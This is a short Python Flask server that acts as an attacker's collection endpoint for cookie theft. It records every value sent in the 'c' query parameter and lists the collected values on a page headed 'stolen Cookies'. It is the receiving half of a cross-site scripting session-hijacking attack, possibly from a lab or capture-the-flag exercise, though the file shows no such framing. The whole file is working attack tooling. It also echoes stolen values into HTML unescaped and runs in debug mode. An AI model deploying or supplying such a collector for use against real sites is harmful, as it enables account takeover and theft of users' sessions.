from flask import Flask
from flask import request

app = Flask(__name__)

cookies = []


@app.route('/', methods = ['GET'])
def index_get():

    c = request.args.get('c')

    if (c != None and len(str(c)) != 0):
        cookies.append(request.args.get('c'))
        return ''

    else:
        payload = '<h1> stolen Cookies </h1><ul>'
        for cookie in cookies:
            payload += '<li>' + cookie + '</li>'

        payload += '</ul>'

        return payload



if __name__ == '__main__':
    app.run(debug=True)